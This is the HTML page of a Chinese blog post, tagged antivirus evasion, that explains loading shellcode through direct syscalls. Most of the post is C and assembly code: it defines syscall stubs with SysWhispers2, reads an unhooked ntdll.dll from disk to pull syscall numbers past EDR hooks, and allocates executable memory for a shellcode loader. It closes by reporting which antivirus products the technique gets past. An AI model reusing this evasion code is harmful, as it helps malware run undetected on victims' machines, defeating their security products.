@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="John Doe" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      重写3环API+syscall 
+      
+      
+      |
+    
+     LIK-ing の blogs
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+  <!-- clipboard -->
+  
+    <script src="https://unpkg.com/clipboard@2/dist/clipboard.min.js"></script>
+    
+<script src="/js/codeCopy.js"></script>
+
+  
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Oranges</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">重写3环API+syscall</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2022-05-19 17:02:27
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E5%85%8D%E6%9D%80/" title="免杀">
+                    <b>#</b> 免杀
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <p>本文主要从重写3环windowsAPI和和纯净NTTDLL进行syscall调用的方式进行免杀</p>
+<h3 id="0x01-syscall介绍"><a href="#0x01-syscall介绍" class="headerlink" title="0x01 syscall介绍"></a>0x01 syscall介绍</h3><p>syscall：在x64下系统从用户态到内核态时使用的就是syscall，主要是通过不同的服务号进入不同的内核函数，其中服务号是内核里面的SSDT表的值，该表每个服务号对于一个内核函数，而且每台电脑上的服务号都有所不同，例如在我的电脑上NTCreateThreadEx中，0c1h就是它对于的服务号</p>
+<p><img src="/2022/05/19/%E9%87%8D%E5%86%993%E7%8E%AFAPI-syscall/image-20220518132243192.png" alt="image-20220518132243192"></p>
+<h3 id="0x02-重构API"><a href="#0x02-重构API" class="headerlink" title="0x02 重构API"></a>0x02 重构API</h3><p><a target="_blank" rel="noopener" href="https://github.com/jthuraisamy/SysWhispers2">https://github.com/jthuraisamy/SysWhispers2</a></p>
+<p>重构API先定义对应API，这里可以使用SysWhispers2来获取对应的函数所包含的参数</p>
+<p>py .\syswhispers.py -f NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx -o syscalls</p>
+<p>之后进行重定义，以NtCreateThreadExProc为例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">restruct.asm</span><br><span class="line">NtAllocateVirtualMemoryExProc Proc</span><br><span class="line">		mov		r10,rcx</span><br><span class="line">		mov		eax,wSystemCall</span><br><span class="line">		syscall</span><br><span class="line">		ret</span><br><span class="line">NtAllocateVirtualMemoryExProc endp</span><br><span class="line"></span><br><span class="line">restruct.c</span><br><span class="line">EXTERN_C NTSTATUS NTAPI NtCreateThreadExProc(</span><br><span class="line">	PHANDLE ThreadHandle,</span><br><span class="line">	ACCESS_MASK DesiredAccess,</span><br><span class="line">	LPVOID ObjectAttributes,</span><br><span class="line">	HANDLE ProcessHandle,</span><br><span class="line">	LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="line">	LPVOID lpParameter,</span><br><span class="line">	ULONG CreateThreadFlags,</span><br><span class="line">	SIZE_T ZeroBits,</span><br><span class="line">	SIZE_T StackSize,</span><br><span class="line">	SIZE_T MaximumStackSize,</span><br><span class="line">	LPVOID pUnkown</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(</span><br><span class="line">	PHANDLE ThreadHandle,</span><br><span class="line">	ACCESS_MASK DesiredAccess,</span><br><span class="line">	LPVOID ObjectAttributes,</span><br><span class="line">	HANDLE ProcessHandle,</span><br><span class="line">	LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="line">	LPVOID lpParameter,</span><br><span class="line">	ULONG CreateThreadFlags,</span><br><span class="line">	SIZE_T ZeroBits,</span><br><span class="line">	SIZE_T StackSize,</span><br><span class="line">	SIZE_T MaximumStackSize,</span><br><span class="line">	LPVOID pUnkown</span><br><span class="line">	);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x3-加载纯净NTDLL"><a href="#0x3-加载纯净NTDLL" class="headerlink" title="0x3 加载纯净NTDLL"></a>0x3 加载纯净NTDLL</h3><p>一些EDR都对用户态的API进行了HOOK，所以直接读取PEB中NTDLL的调用号位置是一个其他的数值，所以我们需要加载未HOOK的NTDLL，即直接从C:\Windows\System32\下加载。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file = CreateFileA(<span class="string">&quot;C:\\Windows\\System32\\ntdll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line">fileSize = GetFileSize(file, <span class="literal">NULL</span>);</span><br><span class="line">fileData = HeapAlloc(GetProcessHeap(), <span class="number">0</span>, fileSize);</span><br><span class="line"><span class="keyword">if</span> (!ReadFile(file, fileData, fileSize, &amp;bytesRead, <span class="literal">NULL</span>))</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>在从NTDLL中获取服务号之前，需要将RVA转换为FOA，因为从PEB中找到的NTDLL是已经加载到内存中的，所以使用的是RVA，而我们这里加载的是个PE文件，所以需要进行转换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PVOID RVAtoRawOffset(DWORD_PTR RVA)</span><br><span class="line">&#123;</span><br><span class="line">	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(imageNTHeaders);</span><br><span class="line">	for (int i = 0; i &lt; imageNTHeaders-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		if ((RVA &gt; (DWORD_PTR)fileData + section-&gt;VirtualAddress) &amp;&amp; (RVA &lt; (DWORD_PTR)fileData + section-&gt;VirtualAddress + section-&gt;SizeOfRawData))</span><br><span class="line">		&#123;</span><br><span class="line">			return (PVOID)(RVA - section-&gt;VirtualAddress + section-&gt;PointerToRawData);</span><br><span class="line">		&#125;</span><br><span class="line">		section++;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>之后就是从NTDLL的导出表中找到对应的函数，获取对应的服务号</p>
+<h4 id="3-1-获取导出表"><a href="#3-1-获取导出表" class="headerlink" title="3.1 获取导出表"></a>3.1 获取导出表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dosHeader = (PIMAGE_DOS_HEADER)fileData;</span><br><span class="line">imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)fileData + dosHeader-&gt;e_lfanew);</span><br><span class="line">PIMAGE_EXPORT_DIRECTORY exportDirRVA = (PIMAGE_EXPORT_DIRECTORY)imageNTHeaders-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-2通过函数名对比找到服务号"><a href="#3-2通过函数名对比找到服务号" class="headerlink" title="3.2通过函数名对比找到服务号"></a>3.2通过函数名对比找到服务号</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">BOOL GetSyscall(PIMAGE_EXPORT_DIRECTORY exportDirRVA, char* funName) &#123;</span><br><span class="line"></span><br><span class="line">	PDWORD addressOfFunctions = NULL;</span><br><span class="line">	PWORD addressOfNameOrdinales = NULL;</span><br><span class="line">	PDWORD addressOfNames = NULL;</span><br><span class="line">	PIMAGE_EXPORT_DIRECTORY exportDirectory = NULL;</span><br><span class="line">	LPCSTR functionName = NULL;</span><br><span class="line">	PVOID pFunctionAddress = NULL;</span><br><span class="line"></span><br><span class="line">	exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + (DWORD_PTR)exportDirRVA);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	addressOfNames = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&amp;exportDirectory-&gt;AddressOfNames));</span><br><span class="line">	addressOfFunctions = (PDWORD)RVAtoRawOffset((DWORD_PTR)fileData + *(&amp;exportDirectory-&gt;AddressOfFunctions));</span><br><span class="line">	addressOfNameOrdinales = (PWORD)((PBYTE)RVAtoRawOffset((DWORD_PTR)fileData + *(&amp;exportDirectory-&gt;AddressOfNameOrdinals)));</span><br><span class="line"></span><br><span class="line">	//printf(&quot;exportDirectory-&gt;NumberOfNames: %d\n&quot;, exportDirectory-&gt;NumberOfNames);</span><br><span class="line"></span><br><span class="line">	for (size_t i = 0; i &lt; exportDirectory-&gt;NumberOfNames; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		functionName = (LPCSTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfNames[i]);</span><br><span class="line"></span><br><span class="line">		pFunctionAddress = (PBYTE)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[addressOfNameOrdinales[i]]);</span><br><span class="line"></span><br><span class="line">		//DWORD_PTR functionVA = (DWORD_PTR)RVAtoRawOffset((DWORD_PTR)fileData + addressOfFunctions[i + 1], textSection);</span><br><span class="line">		//LPCSTR functionNameResolved = (LPCSTR)functionNameVA;</span><br><span class="line">		if (strcmp(functionName, funName) == 0)</span><br><span class="line">		&#123;</span><br><span class="line">			printf(&quot;i: %d\n&quot;, i);</span><br><span class="line">			printf(&quot;addressOfNameOrdinales[i]: %d\n&quot;, addressOfNameOrdinales[i]);</span><br><span class="line"></span><br><span class="line">			printf(&quot;functionName: %s\n&quot;, functionName);</span><br><span class="line">			printf(&quot;pFunctionAddress: %x\n&quot;, addressOfFunctions[addressOfNameOrdinales[i]]);</span><br><span class="line">			WORD cw = 0;</span><br><span class="line">			while (TRUE) &#123;</span><br><span class="line"></span><br><span class="line">				if (*((PBYTE)pFunctionAddress + cw) == 0x0f &amp;&amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05)</span><br><span class="line">					return FALSE;</span><br><span class="line"></span><br><span class="line">				if (*((PBYTE)pFunctionAddress + cw) == 0xc3)</span><br><span class="line">					return FALSE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">				if (*((PBYTE)pFunctionAddress + cw) == 0x4c</span><br><span class="line">					&amp;&amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b</span><br><span class="line">					&amp;&amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1</span><br><span class="line">					&amp;&amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8</span><br><span class="line">					&amp;&amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00</span><br><span class="line">					&amp;&amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) &#123;</span><br><span class="line">					BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);</span><br><span class="line">					BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);</span><br><span class="line">					SystemCall = (high &lt;&lt; 8) | low;</span><br><span class="line">					break;</span><br><span class="line">				&#125;</span><br><span class="line">				cw++;</span><br><span class="line">			&#125;;</span><br><span class="line">			printf(&quot;SystemCall: %x\n&quot;, SystemCall);</span><br><span class="line">			return TRUE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x04-进行shellcode加载"><a href="#0x04-进行shellcode加载" class="headerlink" title="0x04 进行shellcode加载"></a>0x04 进行shellcode加载</h3><p>先将上面获取的服务号保存，再调用对应的函数，以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   funName = &quot;NtAllocateVirtualMemoryEx&quot;;</span><br><span class="line">GetSyscall(exportDirRVA, funName);</span><br><span class="line">MoveSystemCall(SystemCall);</span><br><span class="line">//NtAllocateVirtualMemoryExProc;</span><br><span class="line">NTSTATUS status = NtAllocateVirtualMemoryEx(hProcess, &amp;Address, &amp;uSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0, 0);</span><br><span class="line">if (status != 0) &#123;</span><br><span class="line">	return -1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="0x05-免杀效果"><a href="#0x05-免杀效果" class="headerlink" title="0x05 免杀效果"></a>0x05 免杀效果</h3><p>火绒可以过，也可以命令执行</p>
+<p><img src="/2022/05/19/%E9%87%8D%E5%86%993%E7%8E%AFAPI-syscall/image-20220518175544843.png" alt="image-20220518175544843"></p>
+<p>360安全卫士也可以过，也可以命令执行</p>
+<p><img src="/2022/05/19/%E9%87%8D%E5%86%993%E7%8E%AFAPI-syscall/image-20220518175245846.png" alt="image-20220518175245846"></p>
+<p>360核晶还是直接就杀了</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2022-05-19 17:02:27
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E5%85%8D%E6%9D%80/" title="免杀">
+                        <b>#</b> 免杀
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-syscall%E4%BB%8B%E7%BB%8D"><span class="toc-text">0x01 syscall介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E9%87%8D%E6%9E%84API"><span class="toc-text">0x02 重构API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-%E5%8A%A0%E8%BD%BD%E7%BA%AF%E5%87%80NTDLL"><span class="toc-text">0x3 加载纯净NTDLL</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-%E8%8E%B7%E5%8F%96%E5%AF%BC%E5%87%BA%E8%A1%A8"><span class="toc-text">3.1 获取导出表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2%E9%80%9A%E8%BF%87%E5%87%BD%E6%95%B0%E5%90%8D%E5%AF%B9%E6%AF%94%E6%89%BE%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%8F%B7"><span class="toc-text">3.2通过函数名对比找到服务号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E8%BF%9B%E8%A1%8Cshellcode%E5%8A%A0%E8%BD%BD"><span class="toc-text">0x04 进行shellcode加载</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E5%85%8D%E6%9D%80%E6%95%88%E6%9E%9C"><span class="toc-text">0x05 免杀效果</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2022 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="Search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>First search, index file loading, please wait...<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E9%87%8D%E5%86%993%E7%8E%AFAPI%2Bsyscall + '&url=' + https%3A%2F%2Flik-ing.github.io%2F2022%2F05%2F19%2F%25E9%2587%258D%25E5%2586%25993%25E7%258E%25AFAPI-syscall%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://lik-ing.github.io/2022/05/19/%E9%87%8D%E5%86%993%E7%8E%AFAPI-syscall/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
